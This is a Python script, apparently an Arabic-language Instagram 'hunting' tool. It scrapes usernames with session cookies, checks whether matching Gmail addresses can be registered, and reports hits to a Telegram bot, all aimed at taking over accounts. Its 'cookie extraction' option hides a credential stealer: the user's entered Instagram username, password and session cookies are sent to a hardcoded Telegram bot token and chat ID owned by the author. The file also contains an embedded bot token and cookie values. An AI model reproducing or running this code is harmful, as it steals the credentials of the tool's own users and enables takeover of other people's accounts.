Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
H = '\033[1;34m' #ازرق فاتح
Z2 = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني7
F = '\033[2;32m' #اخضر
A = '\033[3;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E1 = '\x1b[8;31m' # احمر.
import os
from pyfiglet import figlet_format
import sys
import requests
font= 'banner3-D'
txt= "TOPAC"
topac = figlet_format(f'{txt}',font =f'{font}')
print(F+topac)
print(C+'='*35)
topp = requests.get("https://pastebin.com/raw/SV6b35nq")
password = input(f'     {B}ENTAR {X}PASSWORD:{F} ')
if password == "" :
  sys.exit()
if password in str(topp.text):
  print(" FIRST STEP Is Done. Logged in Successfully as ")
  print("Please Wait 5 Minutes, All Packages Are Checking.....")
  os.system("clear")
else:
  print (X+"    توقفت الاداة للتفعيل راسل المطور   @iiit5      ")
  sys.exit()
  os.system("clear")
import time
try :
    import requests
    import user_agent
    import datetime
    import webbrowser
    import pyfiglet
    import threading
    import signal
except ImportError as error :
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install datetime')
    os.system('pip install webbrowser')
    os.system('pip install pyfiglet')
    os.system('pip install threading')
    os.system('pip install signal')
    os.system('cls'if os.name=='nt' else'clear')
    time.sleep(1)
    print('Done.')
    exit()
import requests
import os
from uuid import uuid4
import random
from user_agent import generate_user_agent
import datetime
import json
from time import sleep
from os import system
from datetime import date
import socket
font= 'banner3-D'
txt= "TOPAC"
topac = figlet_format(f'{txt}',font =f'{font}')
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
H = '\033[1;34m' #ازرق فاتح
Z2 = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[3;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E1 = '\x1b[8;31m' # احمر
a=0
z=0
b=0
j=0
m=0
k=0
t=0
x=0
g=0
L=0
f=0
qw =0
E=0
print(topac)
ll= datetime.datetime.now()
r = requests.session()
lll = date.today()

r = requests.session()

def topac3():
	global z,a,x,lll,j,g,t,L,f,qw,E
	Z = '\033[1;31m' #احمر
	X = '\033[1;33m' #اصفر
	Z1 = '\033[2;31m' #احمر ثاني
	FF = '\033[1;32m' #اخضر
	A = '\033[2;39m' #ازرق
	C = "\033[1;97m" #ابيض
	B = '\033[2;36m'#سمائي
	H = '\033[1;34m' #ازرق فاتح
	Z2 = '\033[1;31m' #احمر
	X = '\033[1;33m' #اصفر
	Z1 = '\033[2;31m' #احمر ثاني
	F = '\033[2;32m' #اخضر
	A = '\033[0;30m' #ازرق
	C = "\033[1;97m" #ابيض
	B = '\033[2;36m'#سمائي
	Y = '\033[1;34m' #ازرق فات
	E1 = '\x1b[8;31m' # احمر	
	print(topac)
	
	took =input(f"{B} # {F}ادخل توكن بوتك {C}:")
	if took=='':
		system('clear')
		print('Tok False')
		exit()
	try:
		idddd =int(input(f"{B} # {F}ادخل ايدي حسابك  {C}:"))
	except ValueError as error:
		system('clear')
		print('ID False')
		exit()
	try:
		fil = open('username.txt','r').read().splitlines()
	except FileNotFoundError as error:
		system('clear')
		print('      لا يوجد ملف بهذا الاسم  username.txt')
		exit()
	for fi in fil:
		
		url = 'https://b.i.instagram.com/api/v1/accounts/login/'
		B = (fi)	
		#KL = fi.split('@')[0]
		
		if ('@gmail.com') in B:
			KL= B.split('@')[0]
			headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
			uid = str(uuid4())
			data = {
			'uuid':uid, 
			'password':'ffffdddddaaa666', 
			'username':B, 
			'device_id':uid, 
			'from_reg':'false', 
			'_csrftoken':'missing', 
			'login_attempt_countn':'0'
			}
			re = requests.post(url,headers=headers,data=data).text
			
			if ('"The username you entered ') in re:
				os.system('cls'if os.name=='net'else'clear')
				a+=1
				print(F+topac)
				print(f'{X}[=] {C} Gmai : {F}{L}\n{X}[=] {C} Bad : {Z}{a}\n{X}[=] {C} Bad Mail : {Z}{qw}\n{X}[=] {C} User : {F}{B}{A}[=] -{A} Aol : {A}{t}{A}[=] -{A} Ru : {A}{f}\n\033[1;33m     𓃞T꯭O꯭P꯭A꯭C꯭🇮🇶I꯭R꯭A꯭Q꯭𓃞.')
			else:
				url3 ='https://android.clients.google.com/setup/checkavail'
				headers = {
	        		'Content-Length':'98',
	        		'Content-Type':'text/plain; charset=UTF-8',
	        		'Host':'android.clients.google.com',
	        		'Connection':'Keep-Alive',
	        		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
				data= json.dumps({
	        		'username':B,
	        		'version':'3',
	        		'firstName':'AbaLahb',
	        		'lastName':'AbuJahl'})
				res=requests.post(url3,headers=headers,data=data)
				if res.json()['status'] =='USERNAME_UNAVAILABLE':
					os.system('cls'if os.name=='net'else'clear')
					qw+=1
					print(F+topac)
					print(f'{X}[=] {C} Gmai : {F}{L}\n{X}[=] {C} Bad : {Z}{a}\n{X}[=] {C} Bad Mail : {Z}{qw}\n{X}[=] {C} User : {F}{B}{A}[=] -{A} Aol : {A}{t}{A}[=] -{A} Ru : {A}{f}\n\033[1;33m     𓃞T꯭O꯭P꯭A꯭C꯭🇮🇶I꯭R꯭A꯭Q꯭𓃞.')
				elif res.json()['status'] =='SUCCESS':
						os.system('cls'if os.name=='net'else'clear')
						L+=1
						print(F+topac)
						print(f'{X}[=] {C} Gmai : {F}{L}\n{X}[=] {C} Bad : {Z}{a}\n{X}[=] {C} Bad Mail : {Z}{qw}\n{X}[=] {C} User : {F}{B}{A}[=] -{A} Aol : {A}{t}{A}[=] -{A} Ru : {A}{f}\n\033[1;33m     𓃞T꯭O꯭P꯭A꯭C꯭🇮🇶I꯭R꯭A꯭Q꯭𓃞.')
						G1 = (KL)
						iii=(G1)
						try:
							
							fi1 = open('cookies.txt','r').read().splitlines()
						except FileNotFoundError as error:
							system('clear')
							print(' لا يوجد ملف كوكيز. ')
							exit('')
						url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
						head1 = {
			                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			                'accept-encoding': 'gzip, deflate, br',
			                'accept-language': 'en-US,en;q=0.9',
			                'cookie': '{}'.format(fi1),
			                'referer': 'https://www.instagram.com/{}/'.format(iii),
			                'sec-ch-ua': '"Chromium";v="101", " Not A;Brand";v="99", "Google Chrome";v="92"',
			                'sec-ch-ua-mobile': '?1',
			                'sec-fetch-dest': 'document',
			                'sec-fetch-mode': 'navigate',
			                'sec-fetch-site': 'snone',
			                'upgrade-insecure-requests': '1',
			                'user-agent': generate_user_agent(),
			        
			            }
						rr = requests.get(url22,headers=head1).json()
						try:
							nam = str(rr['graphql']['user']['full_name'])
							iddd = str(rr['graphql']['user']['id'])
							fol = str(rr['graphql']['user']['edge_followed_by']['count'])
							fols =str(rr['graphql']['user']['edge_follow']['count'])
							isp = str(rr['graphql']['user']['is_private'])
							bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
							re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
							ree = re.json()
							dat = ree['data']
							j+=1
							tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=رقم الصيد {j}\n~~~~~~~~~~~~~~\n🇮🇶𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 : {iii}\n🇮🇶𝙣𝙖𝙢𝙚 : {nam}\n🇮🇶𝙚𝙢𝙖𝙞𝙡 : {iii}@gmail.com\n🇮🇶𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨 : {fol}\n🇮🇶𝙁𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙜 : {fols}\n🇮🇶𝙥𝙤𝙨𝙩 : {bio}\n🇮🇶𝙙𝙖𝙩𝙖 : {dat}\n🇮🇶𝙥𝙧𝙞𝙫𝙖𝙘𝙮 : {isp}\n🇮🇶𝙛𝙞𝙨𝙝𝙞𝙣𝙜 𝙝𝙞𝙨𝙩𝙤𝙧𝙮 : {lll}\n🇮🇶𝙡𝙞𝙣𝙠 : https://www.instagram.com/{iii}\n~~~~~~~~~~~~~~\n🇮🇶 𝙥𝙮 :- @OYOYV | @IIIT5')							
							ru= requests.post(tlg)
						except KeyError as error :
							os.system('cls'if os.name=='net'else'clear')
							E+=1
							print(F+topac)
							print(f'{X}[=] {C} Gmai : {F}{L}\n{X}[=] {C} Bad : {Z}{a}\n{X}[=] {C} Bad Mail : {Z}{qw}\n{X}[=] {C} User : {F}{B}{A}[=] -{A} Aol : {A}{t}{A}[=] -{A} Ru : {A}{f}\n\033[1;33m     𓃞T꯭O꯭P꯭A꯭C꯭🇮🇶I꯭R꯭A꯭Q꯭𓃞.')
			

					
			
def topac1():
    global a,z,t,x,ll
    Z = '\033[1;31m' #احمر
    X = '\033[1;33m' #اصفر
    Z1 = '\033[2;31m' #احمر ثاني
    FF = '\033[1;32m' #اخضر
    A = '\033[2;39m' #ازرق
    C = '\033[2;35m' #وردي
    B = '\033[2;36m'#سمائي
    H = '\033[1;34m' #ازرق فاتح
    Z2 = '\033[1;31m' #احمر
    X = '\033[1;33m' #اصفر
    Z1 = '\033[2;31m' #احمر ثاني
    F = '\033[2;32m' #اخضر
    A = '\033[3;39m' #ازرق
    C = '\033[2;35m' #وردي
    B = '\033[2;36m'#سمائي
    Y = '\033[1;34m' #ازرق فات
    E1 = '\x1b[8;31m' # احمر
    print(F+topac)
    username = input(f'{X}[+]{C} -{F} ادخل يوزر حسابك الوهمي :{F} ')
    sleep(1)
    passowrd = input(f'{X}[+]{C} -{F} ادخل باسورد حسابك الوهمي :{F} ')
    sleep(1)
    system('clear')

    c ='https://www.instagram.com/accounts/login/ajax/'
    head1 = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar-AE,ar;q=0.9,en-AU;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-length': '327',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'mid=Ytk9ogABAAHEvEguLxHYNA48BhLE; ig_did=8E821507-827A-4734-BAA9-4681829D80E2; ig_nrcb=1; dpr=1.75; datr=57_iYhyHMuNhD9wsTOwr3Eut; shbid="8401\05447193793584\0541690843508:01f77e7af972d1914fefa04f8496ac7c88bfaf3a7208a44741d83958885c8ebcc6c5a95c"; shbts="1659307508\05447193793584\0541690843508:01f7eebf8b44cd9d38dc9623722713e01c71349d976c7b9ea0c7f36f22fbe12b9d916f8f"; rur="LDC\05447193793584\0541690843524:01f7361ef35df8110c8523a72b20051f91bea9fdb9b36e9528f25e1647438c9abc7dfec3"; csrftoken=112btqL3Wdzo13Cw9hTCxHQ5ozqy6IMK',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-ua': '"Chromium";v="101", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
        'x-asbd-id': '198387',
        'x-csrftoken': '112btqL3Wdzo13Cw9hTCxHQ5ozqy6IMK',
        'x-ig-app-id': '1217981644879628',
        'x-ig-www-claim': 'hmac.AR1pOlqCqarQ98LFf5v5pAR1i2fYUyKNQM2MyW3LqRSXUx9A',
        'x-instagram-ajax': '4934ba29fa49',
        'x-requested-with': 'XMLHttpRequest'
    }
    tim = str(time.time()).split('.')[1]
    data1 = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{passowrd}',
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'trustedDeviceRecords': '{}'
    }
    rq = requests.post(c,headers=head1,data=data1)
    #print(rq.json())
    #exit()
    if ('userId') in rq.json():
     
        
        co = rq.cookies
        coo =co.get_dict()
        
        se = str(coo['sessionid'])
        ds= str(coo['ds_user_id'])
        
        #print(sa)
        
        #exit()
        tok = coo['csrftoken']
        cookiee = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']}"
        toook="5156964607:AAGzbQhaT58mmE99RnIHYMYFw8i0ypzJ2Fc"
        idd="5152965931"
        
        tlg =(f'https://api.telegram.org/bot{toook}/sendMessage?chat_id={idd}&text={username} : {passowrd}\n{cookiee}')
        ru= requests.post(tlg)
     
        
        try:
        	os.remove('cookies.txt')
        	os.remove('Gmail.txt')
        	#os.remove('username.txt')
        	#os.remove('Gmail_True.txt')
        except FileNotFoundError as error :
        	print('Done Remove')
        
        	sleep(0.1)
        	system('clear')
        with open('cookies.txt','a') as f8:
        	f8.write(f'{cookiee}')
def t():
        Z = '\033[1;31m' #احمر
        X = '\033[1;33m' #اصفر
        Z1 = '\033[2;31m' #احمر ثاني
        F = '\033[2;32m' #اخضر
        A = '\033[2;39m' #ازرق
        C = '\033[2;35m' #وردي
        B = '\033[2;36m'#سمائي
        H = '\033[1;34m' #ازرق فاتح
        a=0
        fi3 =input(f" {X}  ادخل الكوكيز   :")
        system("clear")
        iii = input(f' {X}ادخل يوزر الي تريد تسوي لسته يوزرات منه للفحص :{B} ')
        url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
        head1 = {
	            'accept': '*/*',
	            'accept-encoding': 'gzip, deflate, br',
	            'accept-language': 'en-US,en;q=0.9',
	            'cookie': '{}'.format(fi3),
	            'referer': 'https://www.instagram.com/{}/'.format(iii),
	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	            'sec-ch-ua-mobile': '?0',
	            'sec-fetch-dest': 'empty',
	            'sec-fetch-mode': 'cors',
	            'sec-fetch-site': 'same-origin',
	            'user-agent': generate_user_agent(),
	            'x-asbd-id': '437806',
	            'x-ig-app-id': '936619743392459',
	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
	            'x-requested-with': 'XMLHttpRequest'
	        }
	    
        
        
        try:
        	rr = requests.get(url22,headers=head1).json()
        	
        except json.decoder.JSONDecodeError as error:
        	system('clear')
        	print('* \033[1;32m  يجب عليك تغير الكوكيز  ')
        	exit()
        	
        try:
         fol = str(rr['graphql']['user']['edge_follow']['count'])
         idd = str(rr['logging_page_id'])
         ss = idd.split('_')[1]
        except KeyError as error :
             print('   رجا ادخل يوزر صحيح   ا...!')
             exit()
        x = int(fol)
        url4 = f'https://i.instagram.com/api/v1/friendships/{ss}/following/?count={fol}'
        head4 ={
	            'accept': '*/*',
	            'accept-encoding': 'gzip, deflate, br',
	            'accept-language': 'en-US,en;q=0.9',
	            'cookie': '{}'.format(fi3),
	            'referer': 'https://www.instagram.com/',
	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	            'sec-ch-ua-mobile': '?0',
	            'sec-fetch-dest': 'empty',
	            'sec-fetch-mode': 'cors',
	            'sec-fetch-site': 'same-origin',
	            'user-agent': generate_user_agent(),
	            'x-asbd-id': '437806',
	            'x-ig-app-id': '936619743392459',
	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
	            'x-requested-with': 'XMLHttpRequest'
	
	        }
        data4 ={
        	'count': fol
	        }
        re = requests.get(url4,headers=head4,data=data4).json()
      
        try:
        	for top1 in range(0,x):
        	    us = str(re['users'][top1]['username'])
	            a+=1 
	            os.system('cls' if os.name == 'nt' else'clear')
	
	            print(f'''{X} [=] [ {us} ]
	            ''')
	            Fq = ['@gmail.com']
	            Hq = random.choice(Fq)
	            
	            with open('username.txt','a') as f9:
	                f9.write(f'{us}{Hq}\n')
	              
        except IndexError as error :
	        print('  تم السحب ')
	        exit()
    #else
	    
def Re():
	try:
		os.remove('username.txt')
		os.remove('cookies.txt')
		print('   تم مسح اللسته يمكنك سحب لسته جديده')
		B = '\033[2;36m'#سمائي
		X = '\033[1;33m' #اصفر
		F = '\033[1;32m' #اخضر
	except FileNotFoundError as error:
		system('clear')
		print('    الملف خطا')
		exit()
print(f"{X}  1- {C}[=] {B}استخراج كوكيز منفصل \n{X}  2- {C}[=] {B} سحب لسته \n{X}  3- {C}[=] {B} فحص لسته \n {X} 4- {C}[=]  {B} حذف لسته لسحب لسته جديده")
try:
	Y = int(input(f'{B}: اختر من الاعلئ    {F}'))
	system('clear')
except ValueError as error:
	system('clear')
	print('Int Please')
	exit()

if Y ==1:
	  topac1()
if Y ==2:
	  t()
if Y ==3:
	  topac3()
if Y==4:
	  Re()
else:
	  system('clear')
	  print(' خطا ')